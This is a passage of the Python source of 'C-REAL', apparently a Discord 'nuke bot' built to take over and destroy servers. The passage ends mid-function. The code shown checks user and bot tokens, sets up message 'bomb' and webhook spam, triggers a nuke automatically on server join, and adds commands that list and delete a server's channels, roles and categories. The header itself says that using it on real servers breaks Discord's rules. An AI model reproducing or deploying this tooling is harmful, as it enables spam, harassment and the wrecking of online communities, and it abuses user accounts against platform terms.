#!/usr/bin/python3
# -*- coding: utf-8 -*-
"""
MIT License

Copyright (c) 2020 - 2022

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

Don't use the bot on real servers or use it to spam because this is breaking
discord's ToS, and you will be resulted in an account deletion.
"""
# discord
import discord, sys, requests, os, time
from discord.ext import commands
import asyncio
from packaging import version
from random import randint, choice, randrange, random, choices
from threading import Thread
from inputimeout import inputimeout, TimeoutOccurred
from queue import Queue
from io import BytesIO
from pathlib import Path
from math import ceil
from copy import deepcopy
if sys.platform == 'linux':
    import simplejson as json
else:
    import json
# style
from colorama import init, Fore


init(autoreset=True)

# 
__TITLE__ = "C-REAL"
__VERSION__ = "2.4.0"
__AUTHOR__ = "TKperson"
__LICENSE__ = "MIT"

# Global vars
per_page = 15
commands_per_page = 5
number_of_bomb_default = 250
selected_server = None
sorted_commands = []
webhook_targets = []
saved_ctx = None
nuke_on_join = False
auto_nick = False
auto_status = False
selfbot_has_perm = False
timeout = 6
fetching_members = False
bad_filename_map = dict((ord(char), None) for char in '<>:"\\/|?*')
grant_all_permissions = False
# normal functions==============
def exit():
    try:
        input('Press enter to exit...')
    except (EOFError, KeyboardInterrupt):
        pass
    sys.exit(1)

def banner():
    """Handler for non-unicode consoles"""
    sys.stdout.buffer.write(f'''\
 ██████╗                  ██████╗ ███████╗ █████╗ ██╗     
██╔════╝                  ██╔══██╗██╔════╝██╔══██╗██║   Version: {__VERSION__}
██║         █████╗        ██████╔╝█████╗  ███████║██║     Made by:
██║         ╚════╝        ██╔══██╗██╔══╝  ██╔══██║██║       TKperson
╚██████╗                  ██║  ██║███████╗██║  ██║███████╗    and
 ╚═════╝                  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝      cyxl
'''.encode('utf8'))

# Check for > 1.5.1 discord version
if version.parse('1.5.1') > version.parse(discord.__version__):
    print('Please update your discord.py.')
    exit()

settings = {"token":None,"permissions":[],"bot_permission":"2146958847","command_prefix":".","bot_status":"offline","verbose":15,"bomb_messages":{"random":None,"fixed":[]},"webhook_spam":{"usernames":[],"pfp_urls":[],"contents":[]},"after":[],"proxies":[],"ban_whitelist":[]}

def setUp():
    # check location 
    from glob import glob
    config = None
    config_parent_dir = os.path.join(Path().absolute().__str__(), 'data')
    config_path = os.path.join(config_parent_dir, 'default.json')
    json_paths = glob(os.path.join(Path().absolute().__str__(), 'data', '*.json'))

    def getConfig(choice, timeout):
        while True:
            # it really doesn't matter if I use triple quotes or not.... the speed is going to be the same and doing this looks better
            print('=========================')
            print('|                       |')
            print('| [{0}] Load default.json |'.format('1' if 1 in choice else 'x'))
            print('| [{0}] Select .json file |'.format('2' if 2 in choice else 'x'))
            print('| [{0}] Create a new json |'.format('3' if 3 in choice else 'x'))
            print('|                       |')
            print('=========================')
            print('[x] = not Available;')
            try:
                response = inputimeout(prompt='Auto boot with choice [1] in %d seconds...\nChoose 1, 2, or 3\n>> ' % timeout, timeout=timeout)
            except TimeoutOccurred:
                response = '1'

            if response == '1':
                if not os.path.isfile(config_path):
                    print(f'Unable to find file: {config_path}')
                    continue

                with open(config_path, 'r', encoding='utf8') as f:
                    try:
                        return json.loads(f.read())
                    except json.decoder.JSONDecodeError:
                        print(f'There are some errors occured when reading the configuration file. File path -> {config_path}\nI recommend you use https://jsonlint.com/?code= to help checking the configuration file. Skipping reading the default.json file...')
                break
            elif response == '2':
                while True:
                    print('=========================')
                    print('0) Go back')
                    for i, path in enumerate(json_paths):
                        print(f'{str(i+1)}) {path}')
                    index = input('Select the .json file.\n>> ')

                    if not index.isdigit() or not (0 <= (index := int(index)) <= len(json_paths)):
                        print(f'You need to enter an integer that is between or on 0 and {str(len(json_paths))}')
                        continue

                    if index == 0:
                        timeout = 999999
                        break

                    with open(json_paths[index-1], 'r', encoding='utf8') as f:
                        try:
                            return json.loads(f.read())
                        except json.decoder.JSONDecodeError:
                            print(f'There are some errors occured when reading the configuration file. File path -> {config_path}\nI recommend you use https://jsonlint.com/?code= to help checking the configuration file. Skipping reading the default.json file...')

            elif response == '3':
                break

    global settings, settings_copy
    if os.path.isfile(config_path): # have default.json
        config = getConfig([1,2,3], 5)
    
    elif len(json_paths) > 0: # dont have default.json but have other .json file
        config = getConfig([2,3], 999999)

    if config is not None:
        settings.update(config)
    else:
        try:
            # from getpass import getpass
            # settings['token'] = getpass('Enter token. Note: Whatever you entered here will not be displayed.\n>> ')
            settings['token'] = input('Enter token. If you are new refer to this guide: https://github.com/TKperson/Nuking-Discord-Server-Bot-Nuke-Bot/wiki/Basic-setup-and-knowledge-for-using-the-bot\n>> ')
            settings['permissions'].append(input('\nEnter your discord tag or user ID. It is recommended to use discord user ID because some unicode names are hard for the code to check.\n>> '))
        except KeyboardInterrupt:
            sys.exit(0)
        except EOFError:
            print('Invalid input/EOFError. This may be caused by some unicode.')
            exit()

    print('\nTips:')
    print('The default command_prefix is: .')
    print(f'Your currect command_prefix is: {settings["command_prefix"]}')
    print(f'Use {settings["command_prefix"]}config to config the settings and more info about how to config.\n')
    
    print('Join our discord https://discord.gg/FwGWvwv4mW')

    settings_copy = deepcopy(settings)

setUp()
# token, permissions, bomb_messages, webhook_spam, bot_permission, command_prefix, bot_status, verbose, after, proxies = readJson()


want_log_request = want_log_console = want_log_message = want_log_errors = 0

def updateVerbose():
    global want_log_request, want_log_console, want_log_message, want_log_errors
    verbose = settings['verbose']
    want_log_request = verbose & 1 << 0
    want_log_console = verbose & 1 << 1
    want_log_message = verbose & 1 << 2
    want_log_errors  = verbose & 1 << 3
updateVerbose()

# def randomProxy(protocol):
#     # As long it works fine then i'm using this method
#     if proxies is None or len(proxies) == 0:
#         return None
#     return {protocol: choice(proxies)}

is_selfbot = True
headers = {}

def checkToken(token=None):
    if token is None:
        token = settings['token']

    global is_selfbot, headers 
    try:
        headers = {'authorization': token, 'content-type': 'application/json'}
        print('Checking selfbot token.', end='\r')
        if not 'id' in requests.get(url='https://discord.com/api/v8/users/@me', timeout=timeout, headers=headers).json():
            # This is the hardest thing that I have tried to find in my life took me ages to know "Bot <token>" is actually the bot's authorization
            # Reading source codes is always a good thing :)
            headers['authorization'] = 'Bot ' + token
            print('Checking normal bot token.', end='\r')
            if not 'id' in requests.get(url='https://discord.com/api/v8/users/@me', timeout=timeout, headers=headers).json():
                print('Invalid token is being used.')
                exit()
            else:
                is_selfbot = False
    # except requests.exceptions.ProxyError:
    #     print('Bad proxy is being used. You can try to change a proxy or restart the bot.')
    #     exit()
    # except requests.exceptions.ConnectTimeout:
    #     print(f'Proxy reached maximum load time: timeout is {timeout} seconds long.')
    #     exit()
    except requests.exceptions.ConnectionError:
        print('You should probably consider connecting to the internet before using any discord related stuff. If you are connected to wifi and still seeing this message, then maybe try turn off your VPN/proxy/TOR node. If you are still seeing this message or you just don\'t what to turn off vpn, you can try to use websites like repl/heroku/google cloud to host the bot for you. The source code is on https://github.com/TKperson/Nuking-Discord-Server-Bot-Nuke-Bot.')
        exit()
    except (requests.exceptions.InvalidHeader, json.decoder.JSONDecodeError):
        print('Invalid token is being used.')
        exit()

checkToken()

### check updates
print('Checking update...           ', end='\r')
github_version = requests.get('https://raw.githubusercontent.com/TKperson/Nuking-Discord-Server-Bot-Nuke-Bot/master/VERSION.txt').text
if version.parse(github_version) > version.parse(__VERSION__):
    print(f'New C-REAL update has been launched -> {github_version} <- :party:')

print('Loading scripts...' + ' ' * 15, end='\r')


"""
command_prefix   - command prefix
case_insensitive - commands will be callable without case retrictions if this is set to true
self_bot         - self_bot: :class:`bool`
                        If ``True``, the bot will only listen to commands invoked by itself rather
                        than ignoring itself. If ``False`` (the default) then the bot will ignore
                        itself. This cannot be changed once initialised.
intents          - intents: :class:`Intents`
                        The intents that you want to enable for the session. This is a way of
                        disabling and enabling certain gateway events from triggering and being sent.
                        If not given, defaults to a regularly constructed :class:`Intents` class.
"""

async def determine_prefix(bot, message): # https://stackoverflow.com/questions/56796991/discord-py-changing-prefix-with-command
    return settings['command_prefix']

# client = commands.Bot(command_prefix=determine_prefix, case_insensitive=True, self_bot=is_selfbot, proxies=randomProxy('http'))
client = commands.Bot(command_prefix=settings['command_prefix'], case_insensitive=True, self_bot=is_selfbot, intents=discord.Intents().all())
client.remove_command('help')

######### Events #########
@client.event
async def on_connect():
    if is_selfbot:
        for user in settings['permissions']:
            if str(client.user.id) == user or f'{client.user.name}#{client.user.discriminator}' == user:
                global selfbot_has_perm
                selfbot_has_perm = True
        settings['permissions'].append(str(client.user.id))

    global sorted_commands
    sorted_commands = sorted(client.commands, key=lambda e: e.name[0])
    await changeStatus(None, settings['bot_status'])

@client.event
async def on_ready():
    banner()
    print('/+========================================================')
    print(f'| | {Fore.GREEN}Bot ready.')
    print(f'| {Fore.MAGENTA}+ Logged in as')
    print(f'| | {client.user.name}#{client.user.discriminator}')
    print(f'| | {client.user.id}')
    print(f'| {Fore.MAGENTA}+ Permission given to ')
    for permission in settings['permissions']:
        print(f'| | {permission}')
    print(f'| {Fore.MAGENTA}+ Command prefix: ' + settings['command_prefix'])
    if is_selfbot:
        print(f'| {Fore.YELLOW}+ [Selfbot] This is a selfbot. Join servers with join codes.')
    else:
        print(f'| {Fore.YELLOW}+ https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions={settings["bot_permission"]}&scope=bot')
    print('| ~*************************************')
    print('\\+-----')


@client.event
async def on_disconnect():
    '''
    on_disconnect - when the script is disconnected with the profile the bot will run this command
                    usage:    reset status
    '''

    await changeStatus(None, 'offline')

### logs ###
async def log(ctx, message):

    """
    Logging messages to the user
    no args, but has settings.

    Modes:
    - Discord side

    - coming soon
    """
    if want_log_message:
        # if not isDM(ctx) and ctx.guild.id == selected_server.id and 1 << 11 & selected_server.me.guild_permissions.value == 0:
        #     consoleLog(message, True)
        # else:
        try:
            await ctx.send(message)
        except discord.errors.HTTPException:
            for i in range(ceil(len(message) / 2000)):
                await log(ctx, message[2000 * i:2000 * (i + 1)])
        except:
            consoleLog(message)

def consoleLog(message, print_time=False):
    if want_log_console:
        TIME = ''
        if print_time:
            TIME = f'{Fore.MAGENTA}[{time.strftime("%H:%M:%S", time.localtime())}] {Fore.RESET}'

        try:
            print(f'{TIME}{message}')
        except TypeError: # when there's a character that can't be logged with python print function.
            sys.stdout.buffer.write(f'{TIME}{message}'.encode('utf8'))

@client.event
async def on_command_error(ctx, error):
    # source: https://gist.github.com/AileenLumina/510438b241c16a2960e9b0b014d9ed06
    # source: https://github.com/Rapptz/discord.py/blob/master/discord/errors.py
    """
    Error handlers
    It's always a good idea to look into the source code to find things that are hard to find on the internet.
    """

    # Debug mode
    # raise error

    if not want_log_errors or hasattr(ctx.command, 'on_error'):
        return

    # get the original exception
    error = getattr(error, 'original', error)

    # print(error)
    # print(str(type(error)))

    if isinstance(error, commands.CommandNotFound):
        if checkPerm(ctx):
            try:
                await log(ctx, f'Command `{ctx.message.content}` is not found.')
            except discord.errors.HTTPException:
                await log(ctx, 'That command is not found.')

    elif isinstance(error, commands.CheckFailure):
        pass

    elif isinstance(error, discord.Forbidden):
        await log(ctx, f'403 Forbidden: Missing permission.')
    
    elif isinstance(error, discord.errors.HTTPException): # usually caused by sending over 2000 characters limit
        # has already been handled in "def log"
        pass

    elif isinstance(error, commands.UserInputError):
        await log(ctx, 'Invalid input.')

    else:
        # 'args', 'code', 'response', 'status', 'text', 'with_traceback'
        # print(error)
        # print(error.args)
        # print(type(error.args))

        try: # Don't want too many things logged into discord
            await log(ctx, '%s' % error.args)
        except discord.errors.NotFound: # When ctx.channel is deleted 
            pass
        except TypeError: # When there's a charater that can't be logged into discord. Like if error.args contains a tuple which can't be automatically turned into a string.
            consoleLog(f'{Fore.RED}Error -> {error.args}: {Fore.YELLOW}When using "{ctx.message.content}".', True)

if is_selfbot:
    @client.event
    async def on_message(message):
        if message.content.startswith(settings["command_prefix"]) and checkPerm(await client.get_context(message)):
            if message.author.id == client.user.id and not selfbot_has_perm:
                consoleLog(f'{Fore.YELLOW}Account owner {Fore.LIGHTBLUE_EX}"{client.user.name}#{client.user.discriminator}" {Fore.YELLOW}tried to use {Fore.LIGHTBLUE_EX}"{message.content}"{Fore.BLUE}. Too bad, he/she doesn\'t of the power to use this bot.', True)
                return

            message.author = client.user
            await client.process_commands(message)

@client.event
async def on_guild_join(guild):
    if nuke_on_join:
        global selected_server
        selected_server = guild
        await nuke(saved_ctx)

def isDM(ctx):
    """
    No args
    Checking if the ctx is whether from DM or in a server. There are different handlers for handling some commands. 
    """
    return isinstance(ctx.channel, discord.channel.DMChannel)
    # if isinstance(ctx.channel, discord.channel.DMChannel):
    #     return True # in dm
    # return False # in server            

def nameIdHandler(name):
    """
    <@! ID > = pinging user
    <@& ID > = pinging role

    Usage - remove the brakets around the ID

    return - the ID
    """

    if name.startswith('<@!') or name.startswith('<@&'):
        return name[:-1][3:]
    return name

async def embed(ctx, n, title, array):
    """
    Parameters:
    n     - page number. And default is 1
    title - Command name/title
    array - The list for handling
    """

    if not n.isdigit() or (n := int(n) - 1) < 0:
        await log(ctx, 'Bad page number.')
        return

    names = ''
    ids = ''

    item_length = len(array)
    if item_length == 0:
        return await ctx.send(f'{title} count: 0')
    init_item = n * per_page
    final_item = init_item + per_page
    if init_item > item_length - per_page:
        if init_item > item_length:
            await ctx.send('Invalid page number.')
            return
        final_item = init_item + (item_length % per_page)
    else:
        final_item = init_item + per_page

    for i in range(init_item, final_item, 1):
        item = array[i]
        if len(item.name) > 17:
            item.name = item.name[:17] + '...'
        names += f'{item.name}\n'
        ids += f'{str(item.id)}\n '

    # if not isDM(ctx) and 1 << 11 & selected_server.me.guild_permissions.value == 0 and (selected_server is None or ctx.guild.id == selected_server.id):
    #     names = names.split('\n')
    #     ids = ids.split(' ')
    #     consoleLog(f'\n{Fore.GREEN}*{title}*\n{Fore.RESET}Total count: {Fore.YELLOW}{str(item_length)}\n{Fore.GREEN}__Name__{" " * 13}{Fore.CYAN}__ID__\n{ "".join([(Fore.GREEN + names[i].ljust(21) + Fore.CYAN + ids[i]) for i in range(len(names) - 1)]) }{Fore.YELLOW}{n+1}/{str(ceil(item_length / per_page))}', True)
    # else:
    try:
        theColor = randint(0, 0xFFFFFF)
        embed = discord.Embed(
            title = title,
            description = f'Total count: {str(item_length)}; color: #{hex(theColor)[2:].zfill(6)}',
            color = theColor
        )
        embed.add_field(name='Name', value=names, inline=True)
        embed.add_field(name='ID', value=ids, inline=True)
        embed.set_footer(text=f'{n+1}/{str(ceil(item_length / per_page))}')
        await ctx.send(embed=embed)
    except:
        names = names.split('\n')
        ids = ids.split(' ')
        await ctx.send(f'```*{title}*\nTotal count: {str(item_length)}\n__Name__{" " * 13}__ID__\n{ "".join([(names[i].ljust(21) + ids[i]) for i in range(len(names) - 1)]) }{n+1}/{str(ceil(item_length / per_page))}```')

async def hasTarget(ctx):
    """
    Checking if there's a selected server for using the comands.
    """

    if selected_server is not None:
        return True
    elif not isDM(ctx):
        await connect(ctx)
        await log(ctx, f'You have been automatically `{settings["command_prefix"]}connect` to server `{selected_server.name}` because you are not connected to a server and using a command inside a server.')
        return True
    else:
        await log(ctx, f'I am not connected to a server. Try `{settings["command_prefix"]}servers` and `{settings["command_prefix"]}connect`')
        return False

def containing(a, b):
    for c in a:
        if c.name.lower() == b.lower() or str(c.id) == b:
            return c
    return None

def checkPerm(ctx):
    if grant_all_permissions:
        return True

    for user in settings['permissions']:
        if str(ctx.author.id) == user or f'{ctx.author.name}#{ctx.author.discriminator}' == user:
            return True
    if not isDM(ctx):
        consoleLog(f'{Fore.LIGHTRED_EX}{ctx.author.name}#{ctx.author.discriminator} {Fore.RESET}tried to use {Fore.LIGHTYELLOW_EX}"{ctx.message.content}" {Fore.RESET}in server {Fore.LIGHTYELLOW_EX}"{ctx.guild.name}"{Fore.RESET}, at channel {Fore.LIGHTYELLOW_EX}"{ctx.channel.name}"{Fore.RESET}.', True)
    else:
        consoleLog(f'{Fore.LIGHTRED_EX}{ctx.author.name}#{ctx.author.discriminator} {Fore.RESET}tried to use {Fore.LIGHTYELLOW_EX}"{ctx.message.content}" {Fore.RESET}in {Fore.LIGHTYELLOW_EX}the bot\'s direct message{Fore.RESET}.', True)
    return False

def fixedChoice():
    return settings['bomb_messages']['fixed'][randint(0, len(settings['bomb_messages']['fixed']) - 1)]

base64_char = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/'
def random_b64(n=0):
    return ''.join(choices(base64_char, k=settings['bomb_messages']['random'] if n == 0 else n))

alphanum = '0123456789!@#$%^&*ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
def random_an():
    return ''.join(choices(alphanum, k=settings['bomb_messages']['random']))

def sendMessagePerm(ctx):
    pass

def checkTalkPerm(ctx):
    if isDM(ctx): # you can always talk in dm
        return True

    # return calcPerm(ctx, ) and 16384 & ctx.channel.

def configIsSaved():
    # global settings_copy, settings # idk why python did this but after adding this for my 3.8.5 python it works
    return settings_copy == settings

# class discordMember:
#     def __init__(self, name, id_, discriminator=None, channel_id=None):
#         self.name = name
#         self.id = id_
#         self.discriminator = discriminator
#         self.channel_id = channel_id
# server_members = []

# def copyMember(author):
#     server_members.append(discordMember(author['username'], author['id'], author['discriminator']))

# def autoFindChannel():
#     for channel in selected_server.text_channels:
#         for name in ['join', 'welcome', 'incoming']:
#             if name in channel.name:
#                 return channel.id
#     return None
######### Commands ##########

######### Listing  ##########
@commands.check(checkPerm)
@client.command(name='help', aliases=['h', 'commands'])
async def help(ctx, asked_command=None):
    help_list = '```'
    if asked_command is None:
        for command in sorted_commands:
            help_list += f'[{command.name}] '
        await ctx.send(help_list + f'\n\nYou can try {settings["command_prefix"]}help <command> to see all the aliases for the command. Or read the manual.md for more infomation about the commands.```')
    else:
        for command in sorted_commands:
            if asked_command.lower() == command.name.lower():
                help_command = f'```{settings["command_prefix"]}<{command.name}'
                for aliase in command.aliases:
                    help_command += f'|{aliase}'
                help_command += '>'

                for param, default in command.params.items():
                    if param == 'ctx':
                        continue

                    if default.empty is not default.default:
                        help_command += ' {' + param + '=' + str(default.default) + '}'
                    else:
                        help_command += ' [' + param + ']'
                    if default.kind.name == 'KEYWORD_ONLY':
                        break
                help_command += '```'

                await ctx.send(help_command)
                return
        await log(ctx, f'Unable to find command `{asked_command}`.')

@commands.check(checkPerm)
@client.command(name='servers', aliases=['se', 'server'])
async def servers(ctx, n='1'):    
    await embed(ctx, n, 'Servers', client.guilds)

@commands.check(checkPerm)
@client.command(name='channels', aliases=['tc', 'textchannels', 'textchannel', 'channel'])
async def channels(ctx, n='1'):
    if not await hasTarget(ctx):
        return
    await embed(ctx, n, 'Text channels', selected_server.text_channels)

@commands.check(checkPerm)
@client.command(name='roles', aliases=['ro', 'role'])
async def roles(ctx, n='1'):
    if not await hasTarget(ctx):
        return
    await embed(ctx, n, 'Roles', selected_server.roles)

@commands.check(checkPerm)
@client.command(name='categories', aliases=['cat', 'category'])
async def categories(ctx, n='1'):
    if not await hasTarget(ctx):
        return
    await embed(ctx, n, 'Categories', selected_server.categories)

@commands.check(checkPerm)
@client.command(name='voiceChannels', aliases=['vc', 'voicechannel'])
async def voiceChannels(ctx, n='1'):
    if not await hasTarget(ctx):
        return
    await embed(ctx, n, 'Voice channels', selected_server.voice_channels)

@commands.check(checkPerm)
@client.command(name='emojis', alises=['em', 'emoji'])
async def emojis(ctx, n='1'):
    if not await hasTarget(ctx):
        return
    await embed(ctx, n, 'Emojis', selected_server.emojis)

@commands.check(checkPerm)
@client.command(name='members', alises=['me', 'member'])
async def members(ctx, command='1', *, args=None):
    if not await hasTarget(ctx):
        return
    print(len(selected_server.members))
    await embed(ctx, command, 'Members', selected_server.members)

    # global server_members

    # if command.isdigit():
    #     if is_selfbot:
    #         await embed(ctx, command, 'Members', server_members)
    #     else:
    #         await embed(ctx, command, 'Members', selected_server.members)
    # else:
    #     # def gFetchableChannel(channel_id): # check if the channel is good for fectching channel
    #     #     pass
    #     if command == 'fetch':
    #         global fetching_members
    #         args = args.split()

    #         if not is_selfbot:
    #             await log(ctx, f'Fetch command is only made for selfbot; since you are using normal bots, all members in the server `{selected_server.name}` has already be fetched. Try `{settings["command_prefix"]}members` to see all the fetched members.')
    #             return

    #         if args[0].lower() == 'auto':
    #             channel_id = autoFindChannel()
    #             if channel_id is None:
    #                 await log(ctx, f'Unable to find welcome channels. You have to enter the welcome channel\'s in server `{selected_server.name}` manually.')
    #                 return
    #         elif args[0].lower() == 'stop':
    #             fetching_members = False
    #             await log(ctx, 'Fetching stopped.')
    #             return
    #         elif args[0].isdigit():
    #             channel_id = args[0]
    #         else:
    #             await log(ctx, 'Invalid argument: You can only enter `fetch auto` or `fetch <channel_id>`.')
    #             return
    #         # Making sure channel_id is a string
    #         channel_id = str(channel_id)

    #         if len(args) < 3:
    #             cooldown = 0
    #         elif args[2].isdigit():
    #             cooldown = int(args[2])
    #         else:
    #             await log(ctx, 'Please set a positive integer for the cooldown time of fetching every 100 messages. Use `0` if you don\'t want a cooldown.')
    #             return

    #         if args[1].lower() == 'fast':
    #             fetching_members = True
    #             url = f'https://discord.com/api/v8/channels/{channel_id}/messages?limit=100'
    #             await log(ctx, f'```Fetching has started.\nCheck progress: `{settings["command_prefix"]}members`\nStop fetching: `{settings["command_prefix"]}members fetch stop`.\nCooldown: `{cooldown}` seconds.\nNote: duplicated users will only get removed after the fetching stops.```')
    #             while fetching_members:
    #                 r = requests.get(url, headers=headers, proxies=randomProxy('https'), timeout=timeout).json()
    #                 if len(r) == 0:
    #                     break
    #                 for message in r:
    #                     if message['mentions']: # len(message['content']) > 0 and 
    #                         for mention in message['mentions']:
    #                             copyMember(mention)
    #                     elif len(message['attachments']) > 0:
    #                         pass # no handler for images
    #                     elif len(message['embeds']) > 0:
    #                         pass # no handlers for embeds mentions
    #                     else:
    #                         copyMember(message['author'])
    #                 url = f'https://discord.com/api/v8/channels/{channel_id}/messages?before={r[-1]["id"]}&limit=100'
    #                 if cooldown > 0:
    #                     await asyncio.sleep(cooldown)

    #         elif args[1].lower() == 'all':
    #             await log(ctx, f'```Fetching has started.\nCheck progress: `{settings["command_prefix"]}members`\nStop fetching: `{settings["command_prefix"]}members fetch stop`.\nCooldown: `{cooldown}` seconds.\nNote: duplicated users will only get removed after the fetching stops.```')
    #             pass
    #         else:
    #             await log(ctx, 'You need to choose a fetching operation. Options are `all` or `fast`.')

    #         # Removing duplicates

    #         if len(server_members) > 1:
    #             temp = []
    #             temp.append(server_members[0])
    #             for member_ in server_members:
    #                 for i in temp:
    #                     temp.append(member_)

    #             server_members = temp

@commands.check(checkPerm)
@client.command(name='bans')
async def bans(ctx, n='1'):
    if not await hasTarget(ctx):
        return
    await embed(ctx, n, 'Bans', [s.user for s in await selected_server.bans()])

@commands.check(checkPerm)
@client.command(name='connect', aliases=['con'])
async def connect(ctx, *, server=None):
    if server is None and ctx.guild is None:
        await log(ctx, f'Providing a server name is required.')
        return

    if server is None and not isDM(ctx):
        server = ctx.guild
    else:
        temp_name = server
        server = containing(client.guilds, server)
        if server is None:
            await log(ctx, f'Unable to find {temp_name} server.')
            return

    global selected_server
    selected_server = server
    await log(ctx, f'Successfully connected to `{server.name}`.')

#########  Unities  ##########
@commands.check(checkPerm)
@client.command(name='addChannel', aliases=['aCh', 'aChannel'])
async def addChannel(ctx, channel_name, *, category=None):
    if not await hasTarget(ctx):
        return

    if category is not None:
        temp = category
        category = containing(selected_server.categories, category)
        if category is None:
            await log(ctx, f'Unable to find category `{temp}`.')
            return

    try:
        await selected_server.create_text_channel(channel_name, category=category)
        if category is None:
            category = 'No category.'
        else:
            category = category.name
        await log(ctx, f'Successfully added channel `{channel_name}` to category `{category}`.')
    except:
        await log(ctx, f'Unable to add channel `{channel_name}`.')
        raise

@commands.check(checkPerm)
@client.command(name='addVoiceChannel', aliases=['aVoiceChannel', 'aVC'])
async def addVoiceChannel(ctx, voice_channel, *, category=None):
    if not await hasTarget(ctx):
        return

    if category is not None:
        temp = category
        category = containing(selected_server.categories, category)
        if category is None:
            await log(ctx, f'Unable to find category `{temp}`.')
            return

    try:
        await selected_server.create_voice_channel(voice_channel, category=category)
        if category is None:
            category = 'No category.'
        else:
            category = category.name
        await log(ctx, f'Successfully added VC `{voice_channel}` to category `{category}`.')
    except:
        await log(ctx, f'Unable to add VC `{voice_channel}`.')
        raise

@commands.check(checkPerm)
@client.command(name='addEmoji', aliases=['aEmoji', 'aEm'])
async def addEmoji(ctx, item, *, name=None, bits=None):
    if not await hasTarget(ctx):
        return

    if bits is None:
        # Raw IPv4 and IPv6 are not supported
        if item.startswith(('https://', 'http://', 'ftp://', 'ftps://')): # Link EX: https://www.example.com/aaa.png
            try:
                if name is None:
                    await log(ctx, 'Name for emoji? I\'m not always going to name it for you...')
                    return 
                await selected_server.create_custom_emoji(name=(name), image=BytesIO(requests.get(item).content).read())
                await log(ctx, f'Successfully added emoji `{name}`.')
            except:
                raise

        elif item[0] == '<': # EX: <a:triggeredd:627060014431076352>
            item = item.split(':')
            if name is None:
                name = item[1]
            try:
                if item[0] == '<a': # Animated
                     await selected_server.create_custom_emoji(name=(name), image=BytesIO(requests.get(f'https://cdn.discordapp.com/emojis/{item[2][:-1]}.gif?v=1').content).read())
                else:
                    await selected_server.create_custom_emoji(name=(name), image=BytesIO(requests.get(f'https://cdn.discordapp.com/emojis/{item[2][:-1]}.png?v=1').content).read())
                await log(ctx, f'Successfully added emoji: {name}')
            except:
                raise

        elif os.path.isfile(item): # File EX: C:\Users\user\Desktop\something.jpg or EX: .\icon\something.jpg
            with open(item, 'rb') as data:
                await selected_server.create_custom_emoji(name=(name), image=data.read())
                await log(ctx, f'Successfully added emoji: {name}')
        else:
            await log(ctx, 'Bad path to image.')
    else:
        selected_server.create_custom_emoji(name=(name), image=bits)

@commands.check(checkPerm)
@client.command(name='addCategory', aliases=['aCat', 'aCa'])
async def addCategory(ctx, *, category_name):
    if not await hasTarget(ctx):
        return
    
    try:
        await selected_server.create_category(category_name)
        await log(ctx, f'Successfully created category `{category_name}`.')
    except:
        await log(ctx, f'Unable to create category `{category_name}`.')
        raise
    
@commands.check(checkPerm)
@client.command(name='addRole', aliases=['aRole', 'aR'])
async def addRole(ctx, *, name):
    if not await hasTarget(ctx):
        return
    try:
        name = name.split()
        perms = name.pop(-1)
        await selected_server.create_role(name=' '.join(name), permissions=discord.Permissions(permissions=int(perms)))
        await log(ctx, f'Successfully added role `{name}` with permission `{perms}`.')
    except:
        await log(ctx, f'Failed to add role `{name}`.')
        raise

@commands.check(checkPerm)
@client.command(name='moveRole', aliases=['mRole', 'mR'])
async def moveRole(ctx, *, name):
    if not await hasTarget(ctx):
        return
    try:
        name = name.split()
        position = name.pop(-1)
        name = ' '.join(name)
        if len(name) == 0 or not position.isdigit():
            await log(ctx, 'Invalid inputs.')
            return

        role = containing(selected_server.roles, name)
        if role is None:
            await log(ctx, f'Unable to find role `{name}`.')
        await role.edit(position=int(position))
        await log(ctx, f'Successfully moved role {role.name} to position `{str(position)}`.')
    except:
        await log(ctx, f'Unable to move role `{name}` to position `{position}`.')
        raise

@commands.check(checkPerm)
@client.command(name='deleteRole', aliases=['dRole', 'dR'])
async def deleteRole(ctx, *, name):
    if not await hasTarget(ctx):
        return
    
    role = containing(selected_server.roles, name)
    if role is None:
        await log(ctx, f'Unable to find `{name}`.')

    try:
        await role.delete()
        await log(ctx, f'Successfully removed role `{role.name}`')
    except:
        await log(ctx, f'Unable to delete role `{role.name}`.')
        raise

@commands.check(checkPerm)
@client.command(name='deleteChannel', aliases=['dChannel', 'dCh'])
async def deleteChannel(ctx, channel_name):
    if not await hasTarget(ctx):
        return

    channel = containing(selected_server.text_channels, channel_name)

    if channel is None:
        await log(ctx, f'Unable to find text channel `{channel_name}`.')

    try:
        await channel.delete(reason=None)
        await log(ctx, f'Channel `{channel.name}` is deleted.')
    except:
        await log(ctx, f'Unable to delete channel `{channel.name}`.')
        raise

@commands.check(checkPerm)
@client.command(name='deleteVoiceChannel', aliases=['dVC', 'dVoiceChannel'])
async def deleteVoiceChannel(ctx, VC_name):
    if not await hasTarget(ctx):
        return

    channel = containing(selected_server.voice_channels, VC_name)

    if channel is None:
        await log(ctx, f'Unable to find voice channel `{VC_name}`.')

    try:
        await channel.delete(reason=None)
        await log(ctx, f'Voice channel `{channel.name}` is deleted.')
    except:
        consoleLog(f'Unable to delete voice channel `{channel.name}`.')
        raise

@commands.check(checkPerm)
@client.command(name='deleteCategory', aliases=['dCat', 'dCategory'])
async def deleteCategory(ctx, *, category_name):
    if not await hasTarget(ctx):
        return

    channel = containing(selected_server.categories, category_name)

    if channel is None:
        await log(ctx, f'Unable to find category `{category_name}`.')

    try:
        await channel.delete(reason=None)
        await log(ctx, f'Category `{channel.name}` is deleted.')
    except:
